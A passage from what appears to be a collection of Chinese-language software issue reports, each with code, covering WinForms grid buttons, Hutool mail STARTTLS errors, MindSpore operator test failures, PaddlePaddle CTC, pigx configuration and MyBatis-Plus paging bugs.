System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(249)))), ((int)(((byte)(255))))); dataGridViewCellStyle6.Font = new System.Drawing.Font(""微软雅黑"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(160)))), ((int)(((byte)(255))))); dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True; this.uiDataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle6; this.uiDataGridView1.RowHeadersWidth = 51; dataGridViewCellStyle7.BackColor = System.Drawing.Color.White; dataGridViewCellStyle7.Font = new System.Drawing.Font(""微软雅黑"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134))); dataGridViewCellStyle7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(220)))), ((int)(((byte)(236)))), ((int)(((byte)(255))))); dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(48)))), ((int)(((byte)(48))))); this.uiDataGridView1.RowsDefaultCellStyle = dataGridViewCellStyle7; this.uiDataGridView1.RowTemplate.Height = 27; this.uiDataGridView1.ScrollBarRectColor = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(160)))), ((int)(((byte)(255))))); this.uiDataGridView1.SelectedIndex = -1; this.uiDataGridView1.Size = new System.Drawing.Size(492, 225); this.uiDataGridView1.TabIndex = 2; this.uiDataGridView1.ZoomScaleRect = new System.Drawing.Rectangle(0, 0, 0, 0); // // UserName1 // this.UserName1.DataPropertyName = ""UserName""; this.UserName1.HeaderText = ""UserName1""; this.UserName1.MinimumWidth = 6; this.UserName1.Name = ""UserName1""; this.UserName1.Width = 125; // // UserStatus1 // this.UserStatus1.DataPropertyName = ""UserStatus1""; this.UserStatus1.HeaderText = ""设置""; this.UserStatus1.MinimumWidth = 6; this.UserStatus1.Name = ""UserStatus1""; this.UserStatus1.Resizable = System.Windows.Forms.DataGridViewTriState.True; this.UserStatus1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Automatic; this.UserStatus1.Text = ""设置""; this.UserStatus1.ToolTipText = ""设置""; this.UserStatus1.UseColumnTextForButtonValue = true; this.UserStatus1.Width = 125; // // UserType1 // this.UserType1.DataPropertyName = ""UserType""; this.UserType1.HeaderText = ""UserType1""; this.UserType1.MinimumWidth = 6; this.UserType1.Name = ""UserType1""; this.UserType1.ToolTipText = ""UserType1""; this.UserType1.Width = 125; // // Form1 // this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None; this.ClientSize = new System.Drawing.Size(795, 532); this.Controls.Add(this.uiDataGridView1); this.Controls.Add(this.dgvUser); this.Margin = new System.Windows.Forms.Padding(4); this.Name = ""Form1""; this.Text = ""Form1""; this.Load += new System.EventHandler(this.Form1_Load); ((System.ComponentModel.ISupportInitialize)(this.dgvUser)).EndInit(); ((System.ComponentModel.ISupportInitialize)(this.uiDataGridView1)).EndInit(); this.ResumeLayout(false); } #endregion private System.Windows.Forms.DataGridView dgvUser; private System.Windows.Forms.DataGridViewTextBoxColumn UserName; private DataGridViewDisableButtonColumn UserStatus; private System.Windows.Forms.DataGridViewTextBoxColumn UserType; private DataGridViewDisableButtonColumn dataGridViewDisableButtonColumn1; private Sunny.UI.UIDataGridView uiDataGridView1; private System.Windows.Forms.DataGridViewTextBoxColumn UserName1; private DataGridViewDisableButtonColumn UserStatus1; private System.Windows.Forms.DataGridViewTextBoxColumn UserType1; } public partial class Form2 : UIPage { public Form2() { InitializeComponent(); } public List&lt;User&gt; GetAllUser() { List&lt;User&gt; UserList = new List&lt;User&gt;(); User u = new User(); u.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u.UserName = ""张三丰""; u.UserType = 0; UserList.Add(u); User u1 = new User(); u1.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u1.UserName = ""周芷若""; u1.UserType = 1; UserList.Add(u1); User u2 = new User(); u2.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u2.UserName = ""赵敏""; u2.UserType = 1; UserList.Add(u2); User u3 = new User(); u3.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u3.UserName = ""张无忌""; u3.UserType = 0; UserList.Add(u3); return UserList; } private void Form1_Load(object sender, EventArgs e) { this.uiDataGridView1.AutoGenerateColumns = false; List&lt;User&gt; UserList1 = GetAllUser(); this.uiDataGridView1.DataSource = UserList1; string num1 = string.Empty; int count1 = this.uiDataGridView1.Rows.Count; for (int i = 0; i &lt; count1; i++) { num1 = this.uiDataGridView1.Rows[i].Cells[""UserType1""].FormattedValue.ToString(); DataGridViewDisableButtonCell btnCell = (DataGridViewDisableButtonCell) this.uiDataGridView1.Rows[i].Cells[""UserStatus1""]; if (num1.Equals(""0"")) { btnCell.Enabled = false; } else btnCell.Enabled = true; } this.dgvUser.AutoGenerateColumns = false; List&lt;User&gt; UserList = GetAllUser(); this.dgvUser.DataSource = UserList; string num = string.Empty; int count = this.dgvUser.Rows.Count; for (int i = 0; i &lt; count; i++) { num = this.dgvUser.Rows[i].Cells[""UserType""].FormattedValue.ToString(); DataGridViewDisableButtonCell btnCell = (DataGridViewDisableButtonCell) this.dgvUser.Rows[i].Cells[""UserStatus""]; if (num.Equals(""0"")) { btnCell.Enabled = false; } else btnCell.Enabled = true; } } } public partial class Form2 : Form { public Form2() { InitializeComponent(); } public List&lt;User&gt; GetAllUser() { List&lt;User&gt; UserList = new List&lt;User&gt;(); User u = new User(); u.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u.UserName = ""张三丰""; u.UserType = 0; UserList.Add(u); User u1 = new User(); u1.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u1.UserName = ""周芷若""; u1.UserType = 1; UserList.Add(u1); User u2 = new User(); u2.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u2.UserName = ""赵敏""; u2.UserType = 1; UserList.Add(u2); User u3 = new User(); u3.UserID = Guid.NewGuid().ToString().Replace(""-"", """"); u3.UserName = ""张无忌""; u3.UserType = 0; UserList.Add(u3); return UserList; } private void Form1_Load(object sender, EventArgs e) { this.uiDataGridView1.AutoGenerateColumns = false; List&lt;User&gt; UserList1 = GetAllUser(); this.uiDataGridView1.DataSource = UserList1; string num1 = string.Empty; int count1 = this.uiDataGridView1.Rows.Count; for (int i = 0; i &lt; count1; i++) { num1 = this.uiDataGridView1.Rows[i].Cells[""UserType1""].FormattedValue.ToString(); DataGridViewDisableButtonCell btnCell = (DataGridViewDisableButtonCell) this.uiDataGridView1.Rows[i].Cells[""UserStatus1""]; if (num1.Equals(""0"")) { btnCell.Enabled = false; } else btnCell.Enabled = true; } this.dgvUser.AutoGenerateColumns = false; List&lt;User&gt; UserList = GetAllUser(); this.dgvUser.DataSource = UserList; string num = string.Empty; int count = this.dgvUser.Rows.Count; for (int i = 0; i &lt; count; i++) { num = this.dgvUser.Rows[i].Cells[""UserType""].FormattedValue.ToString(); DataGridViewDisableButtonCell btnCell = (DataGridViewDisableButtonCell) this.dgvUser.Rows[i].Cells[""UserStatus""]; if (num.Equals(""0"")) { btnCell.Enabled = false; } else btnCell.Enabled = true; } } }"
@ApiOperationSupport注解一个小建议,"就是在@ApiOperationSupport里添加一个 includeParameters,和ignoreParameters相反,只包含这几个参数的意思,这样两个参数配合起来就能更加的强大,另外最好这两个参数能一起使用,例如:   <code>: @PostMapping(""/testParameters"") @ApiOperation(value = ""测试参数"") @ApiOperationSupport(ignoreParameters = {""userId""},includeParametes={""admin.id"",""admin.name""}) public void testParameters(@RequestBody Admin admin, @RequestHeader String userId){ System.out.println(admin); System.out.println(userId); }"
变量类型错误导致部分钩子显示异常的问题,最近出现了插件在使用一些钩子的时候，显示不完整的问题（如下图） 如下：   <code>: $_G['setting']['pluginhooks'][$hookkey] $_G['setting']['pluginhooks']['viewthread_postfooter'][0] foreach($funcs as $hookkey =&gt; $hookfuncs) { $funcs = !$func ? $_G['setting'][HOOKTYPE][$hscript][$script][$type] : array($func =&gt; $_G['setting'][HOOKTYPE][$hscript][$script][$type][$func]); foreach($funcs as $hookkey =&gt; $hookfuncs) { $_G['setting']['pluginhooks'][$hookkey] = array(); foreach($hookfuncs as $hookfunc) {
发送邮件报错 Unrecognized SSL message,"JDK版本： openjdk_8_201 hutool版本： 5.8.4 必须启用 starttls 使用setStarttlsEnable启用时会报错。 使用setCustomProperty开启则正常发送邮件 堆栈信息   <code>: public static void main(String[] args) throws GeneralSecurityException { MailAccount account = new MailAccount(); account.setHost(""smtp.office365.com""); // account.setCustomProperty(""mail.smtp.starttls.enable"", true); // 可以正常发送 account.setStarttlsEnable(true); // 报错 account.setFrom(""xxxx &lt;service@xxxx.co.in&gt;""); account.setUser(""service@xxxx.co.in""); account.setPass(""xxxxx""); account.setSocketFactoryPort(587); account.setAuth(true); Mail.create(account) .setTos(""2808xxxx@qq.com"") .setTitle(""邮箱验证"") .setContent(""您的验证码是：&lt;h3&gt;2333&lt;/h3&gt;"") .setHtml(true) .send(); } Exception in thread ""main"" cn.hutool.extra.mail.MailException: MessagingException: Could not connect to SMTP host: smtp.office365.com, port: 25 at cn.hutool.extra.mail.Mail.send(Mail.java:398) at com.xxx.xxx.CommonTest.main(CommonTest.java:65) Caused by: javax.mail.MessagingException: Could not connect to SMTP host: smtp.office365.com, port: 25; nested exception is: javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection? at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2211) at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:740) at javax.mail.Service.connect(Service.java:388) at javax.mail.Service.connect(Service.java:246) at javax.mail.Service.connect(Service.java:195) at javax.mail.Transport.send0(Transport.java:254) at javax.mail.Transport.send(Transport.java:124) at cn.hutool.extra.mail.Mail.doSend(Mail.java:412) at cn.hutool.extra.mail.Mail.send(Mail.java:390) ... 1 more Caused by: javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection? at sun.security.ssl.InputRecord.handleUnknownRecord(InputRecord.java:710) at sun.security.ssl.InputRecord.read(InputRecord.java:527) at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975) at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) at com.sun.mail.util.SocketFetcher.configureSSLSocket(SocketFetcher.java:626) at com.sun.mail.util.SocketFetcher.createSocket(SocketFetcher.java:400) at com.sun.mail.util.SocketFetcher.getSocket(SocketFetcher.java:217) at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2175) ... 9 more"
[CT][MS][OP] Sign has some problems at cpu and gpu,": CPU GPU /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 在Ascend环境，没有发现问题。 验收动态shape的Sign算子，取对应CPU和GPU环境的whl包 在CPU和GPU环境安装对应whl包后，执行原静态Sign测试用例，出现TypeError 在CPU环境出现TypeError，不支持float64和int16 operations/test_sign.py:173: share/ops/primitive/sign_ops.py:59: in forward_cmp out_mindspore = self.forward_mindspore_impl() share/ops/primitive/sign_ops.py:32: in forward_mindspore_impl out = net(input) share/utils.py:173: in call out = super().call(*args, **kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:463: in call raise err /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:460: in call output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:353: in run_construct output = self.construct(*cast_inputs, **kwargs) share/ops/primitive/sign_ops.py:19: in construct return self.sign(input) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:247: in call return _run_op(self, self.name, args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/common/api.py:78: in wrapper results = fn(*arg, **kwargs) obj = Prim[Sign], op_name = 'Sign' args = (Tensor(shape=[128, 64, 1, 1, 2], dtype=Int16, value= [[[[[ 1, 0]]], [[[ 1, 0]]], [[[-1, 0]]], ... [[[ 1, -...[[ 2, 0]]]], [[[[ 0, -1]]], [[[ 0, 0]]], [[[ 1, -1]]], ... [[[-1, 0]]], [[[ 0, 1]]], [[[ 1, 1]]]]]),) E TypeError: mindspore/core/utils/check_convert_utils.cc:571 CheckSubClass] Primitive[Sign]'s input argument[x] must be a type of {Tensor[Float16], Tensor[Float32], Tensor[Int32], }, but got Tensor[Int16]. E E # In file /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/zeros_like_impl.py(61) E return F.zeros_like(x) E ^ /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:682: TypeError 在GPU环境出现TypeError ，不支持float64 passed   <code>: def test_sign_input_128x64x1x1x2_fp64(): fact = SignFactory(input_shape=(128, 64, 1, 1, 2), dtype=np.float64) &gt; fact.forward_cmp() operations/test_sign.py:161: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ share/ops/primitive/sign_ops.py:59: in forward_cmp out_mindspore = self.forward_mindspore_impl() share/ops/primitive/sign_ops.py:32: in forward_mindspore_impl out = net(input) share/utils.py:173: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:463: in __call__ raise err /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:460: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:353: in run_construct output = self.construct(*cast_inputs, **kwargs) share/ops/primitive/sign_ops.py:19: in construct return self.sign(input) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:247: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/common/api.py:78: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[Sign], op_name = 'Sign' args = (Tensor(shape=[128, 64, 1, 1, 2], dtype=Float64, value= [[[[[ 1.40238713e+00, 1.47926512e+00]]], [[[-6.49243193e-01...216544e-01, 4.89856742e-01]]], [[[-5.60997077e-01, -1.70810494e+00]]], [[[-5.26887937e-01, 1.59444733e+00]]]]]),) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E TypeError: mindspore/core/utils/check_convert_utils.cc:571 CheckSubClass] Primitive[Sign]'s input argument[x] must be a type of {Tensor[Float16], Tensor[Float32], Tensor[Int32], }, but got Tensor[Float64]. E E # In file /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/zeros_like_impl.py(61) E return F.zeros_like(x) E ^ def test_sign_input_128x64x1x1x2_int16(): fact = SignFactory(input_shape=(128, 64, 1, 1, 2), dtype=np.int16) fact.forward_cmp() @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" output = real_run_op(obj, op_name, args) def test_sign_input_128x64x1x1x2_fp64(): fact = SignFactory(input_shape=(128, 64, 1, 1, 2), dtype=np.float64) &gt; fact.forward_cmp() operations/test_sign.py:161: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ share/ops/primitive/sign_ops.py:59: in forward_cmp out_mindspore = self.forward_mindspore_impl() share/ops/primitive/sign_ops.py:32: in forward_mindspore_impl out = net(input) share/utils.py:173: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:463: in __call__ raise err /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:460: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:353: in run_construct output = self.construct(*cast_inputs, **kwargs) share/ops/primitive/sign_ops.py:19: in construct return self.sign(input) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:247: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/common/api.py:78: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[Sign], op_name = 'Sign' args = (Tensor(shape=[128, 64, 1, 1, 2], dtype=Float64, value= [[[[[-7.34630017e-01, 4.50444418e-01]]], [[[-1.09708319e+00...013547e+00, -5.48438616e-01]]], [[[-1.36545958e+00, 1.87539340e+00]]], [[[-2.40103110e-02, -1.31568416e+00]]]]]),) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E TypeError: mindspore/core/utils/check_convert_utils.cc:571 CheckSubClass] Primitive[Sign]'s input argument[x] must be a type of {Tensor[Int32], Tensor[Float16], Tensor[Float32], }, but got Tensor[Float64]. E E # In file /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/zeros_like_impl.py(61) E return F.zeros_like(x) E ^ /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:682: TypeError"
develop下的CTC在动态图下出错了,"下面的代码在1.7.1下是ok的 但是在develop下就报错了   <code>: # -*- coding: utf-8 -*- # @Time : 2020/4/23 17:05 # @Author : zhoujun import paddle.fluid as fluid import numpy as np import paddle print(paddle.__version__) # length of the longest logit sequence max_seq_length = 5 # length of the longest label sequence max_label_length = 3 # number of logit sequences batch_size = 16 # class num class_num = 5 place = fluid.CUDAPlace(0) if fluid.is_compiled_with_cuda() else fluid.CPUPlace() with fluid.dygraph.guard(place): logits = np.random.rand(max_seq_length, batch_size, class_num + 1).astype(""float32"") logits_length = np.array([max_seq_length] * batch_size).astype(""int64"") label = np.random.randint(0, class_num, [batch_size, max_label_length]).astype(""int32"") label_length = np.array([max_label_length] * batch_size).astype(""int64"") label = fluid.dygraph.to_variable(label) label_length = fluid.dygraph.to_variable(label_length) logits = fluid.dygraph.to_variable(logits) logits_length = fluid.dygraph.to_variable(logits_length) label.stop_gradient = True label_length.stop_gradient = True logits_length.stop_gradient = True cost = fluid.layers.warpctc(input=logits, label=label, input_length=logits_length, label_length=label_length) print(cost)"
pigx 3.2 版本 pigx-upms-biz-dev.yml 上的默认数据库配置文件无法读取变量,"pigx版本: 3.2 （当前master ） 操作系统: macos 是否修改包名: 否 spring: datasource: type: com.alibaba.druid.pool.DruidDataSource druid: driver-class-name: com.mysql.cj.jdbc.Driver username: ${MYSQL-USER:root} password: ${MYSQL-PWD:root} 这个配置无法读取到在pigx/pigx-register/src/main/resources/bootstrap.yml 保存的mysql登陆信息,其他配置可以； 目前变通方式是这个配置的 username: ${MYSQL-USER:root} password: ${MYSQL-PWD:root} 改为与bootstrap.yml 一致   <code>: [Druid-ConnectionPool-Create-1416134608] ERROR [com.alibaba.druid.pool.DruidDataSource] DruidDataSource.java:2603 - create connection SQLException, url: jdbc:mysql://pigx-mysql:3306/pigxx?characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=GMT%2B8&amp;allowMultiQueries=true, errorCode 0, state 08001 java.sql.SQLNonTransientConnectionException: Public Key Retrieval is not allowed"
分页limit无法修改问题,"Page size的值修改不了sql limit rows 版本: 2.02 打印的sql: ... LIMIT 0,2147483647 正确的应该是: ... LIMIT 0,5 在使用 1.5 版本的时候没有这个问题   <code>: Page&lt;Carpooling&gt; page = new Page&lt;&gt;(); page.setSize(5); Carpooling carpooling = new Carpooling() EntityWrapper&lt;Carpooling&gt; wrapper = new EntityWrapper&lt;&gt;(carpooling); carpooling.selectPage(page, wrapper);"
Warning while compling  linear_chain_crf_op,"Warning log as below:   <code>: [ 62%] Building CXX object paddle/operators/CMakeFiles/lrn_op.dir/lrn_op.cc.o /home/*/Paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/util/EmulateArray.h: 在成员函数‘void paddle::operators::LinearChainCRFGradOpKernel&lt;Place, T&gt;::BackwardOneSequence(const paddle::platform::DeviceContext&amp;, T, const paddle::framework::Tensor&amp;, const paddle::framework::Tensor&amp;, const paddle::framework::Tensor&amp;, const paddle::framework::Tensor&amp;, paddle::framework::Tensor*, paddle::framework::Tensor*, paddle::framework::Tensor*) const [with Place = paddle::platform::GPUPlace; T = float]’中: /home/disk1/wanghaoshuang/random/Paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/util/EmulateArray.h:24:59: 警告：数组下标大于数组边界 [-Warray-bounds] EIGEN_STRONG_INLINE T&amp; operator[] (size_t index) { return values[index]; } ^"
"[CT][MS][OP]When trans is 2 or c,precision failure occurred in solve_triangular interface grad implementation.","When trans is 2 or c,precision failure occurred in solve_triangular interface. / 硬件环境: CPU GPU /device gpu /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph test_solvetriangular_input_a_2d_dtype_fp64_b_2d_fp64_lower_false_trans_2_unit_diagonal_false test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c pytest -s -v test_solvetriangular.py::test_solvetriangular_input_a_2d_dtype_fp64_b_2d_fp64_lower_false_trans_2_unit_diagonal_false pytest -s -v test_solvetriangular.py::test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c pass trans参数设为c或者2时，出现精度问题或与标杆对不上问题   <code>: def test_solvetriangular_input_a_2d_dtype_fp64_b_2d_fp64_lower_false_trans_2_unit_diagonal_false(): x = np.random.randn(128, 128) input_a = Tensor(np.matmul(x, x.transpose()) + np.eye(128), dtype=mstype.float64) input_b = Tensor(np.random.randn(128, 33), dtype=mstype.float64) lower = False trans = 2 unit_diagonal = False fact = SolveTriangularMock( inputs=[input_a, input_b, lower, trans, unit_diagonal]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[-2.51897210e-05 -2.31463392e-06 -1.85082374e-05 8.56361600e-06 E -3.04902928e-05 -2.50220077e-05 1.35763780e-06 3.79459572e-06 E -9.25507501e-06 9.82375935e-06 -4.91034952e-06 1.58097244e-06 E 1.16484090e-05 -4.73595579e-05 1.94729928e-05 -4.33466944e-07 E 2.00108115e-05 -3.14592429e-05 -1.34600635e-05 4.77021875e-06 E -1.30752238e-05 3.31092426e-05 -8.53786542e-05 2.10081964e-05 E -1.73366339e-05 -3.78276566e-06 2.33573721e-05 2.59376306e-05 E -5.94369203e-05 -1.04026186e-05 -1.17845737e-05 1.49238524e-05 E -4.04171956e-05 -3.26706056e-05 -4.98008549e-05 1.68923845e-05 E -3.88087965e-05] E data_me_error:[-3.65323653e-05 -1.28589006e-05 -3.19786865e-05 2.20566228e-05 E -4.07435910e-05 -3.73903971e-05 -1.04758290e-05 1.41505379e-05 E -2.23210644e-05 -1.78330252e-06 5.10930151e-06 1.27874244e-05 E 5.55167747e-07 -5.88543013e-05 6.59956685e-06 1.03893920e-05 E 8.72312636e-06 -1.84744443e-05 -2.47341979e-06 1.64334954e-05 E -1.94623500e-06 2.04983871e-05 -7.40011537e-05 6.53896614e-06 E -6.98584868e-06 7.24002729e-06 1.15266706e-05 1.25556718e-05 E -4.62828443e-05 3.67243741e-06 -1.11033937e-06 4.69073557e-06 E -2.86225902e-05 -2.26409783e-05 -3.94537411e-05 4.24890336e-06 E -2.86070426e-05] E loss:[1.13426443e-05 1.05442666e-05 1.34704491e-05 1.34930068e-05 E 1.02532982e-05 1.23683895e-05 1.18334668e-05 1.03559422e-05 E 1.30659894e-05 1.16070619e-05 1.00196510e-05 1.12064520e-05 E 1.10932413e-05 1.14947434e-05 1.28734260e-05 1.08228589e-05 E 1.12876851e-05 1.29847986e-05 1.09866437e-05 1.16632766e-05 E 1.11289888e-05 1.26108555e-05 1.13775004e-05 1.44692303e-05 E 1.03507852e-05 1.10227929e-05 1.18307014e-05 1.33819588e-05 E 1.31540760e-05 1.40750560e-05 1.06742343e-05 1.02331168e-05 E 1.17946054e-05 1.00296273e-05 1.03471139e-05 1.26434811e-05 E 1.02017539e-05] def test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c(): x = np.random.randn(128, 128) input_a = Tensor(np.matmul(x, x.transpose()) + np.eye(128), dtype=mstype.float32) input_b = Tensor(np.random.randn(128), dtype=mstype.float32) lower = False trans = 'C' unit_diagonal = True fact = SolveTriangularMock(inputs=[input_a, input_b, lower, trans, unit_diagonal]) fact.forward_cmp() fact.loss = 1e-3 &gt; fact.grad_cmp() test_solvetriangular.py:342: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/solvetriangular_ops.py:107: in grad_cmp self.loss) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[ 0. , -15.586267, -143.93785 , ..., nan, nan, nan], [ -... [ -0. , -0. , -0. , ..., -0. , -0. , 0. ]], dtype=float32) data_me = array([[ 0., nan, nan, ..., nan, nan, nan], [ 0., 0., nan, ..., nan, nan, nan], [ 0., 0., 0., ..., na... 0., nan, nan], [ 0., 0., 0., ..., 0., 0., nan], [ 0., 0., 0., ..., 0., 0., 0.]], dtype=float32) rtol = 0.001, atol = 0.001, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)): &gt; assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) E AssertionError"
[CT][MS][OP] The testcase of SegmentMax、SegmentMin、SegmentSum shape[0] of imput_x equal to 1,"The testcase of SegmentMax、SegmentMin、SegmentSum shape[0] of imput_x equal to 1 The testcase of SegmentMax、SegmentMin、SegmentSum shape[0] of imput_x equal to 1 / 硬件环境: /device cpu : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph test_segmentsum_input_dtype_uint16_2d: pytest test_segmentmin.py::test_segmentmin_input_dtype_uint16_2d pytest test_segmentmax.py::test_segmentmax_input_dtype_uint16_2d pytest test_segmentsum.py::test_segmentsum_input_dtype_uint16_2d run pass and no error   <code>: def test_segmentsum_input_dtype_uint16_2d(): input_list = [] x0 = Tensor(np.random.randint(100, size=(1, 57)).astype(np.uint16)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0] * 10, size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentSumMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_segmentsum_input_dtype_uint16_2d(): input_list = [] x0 = Tensor(np.random.randint(100, size=(1, 57)).astype(np.uint16)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0] * 10, size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentSumMock(inputs=input_list) &gt; fact.forward_cmp() test_segmentsum.py:158: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 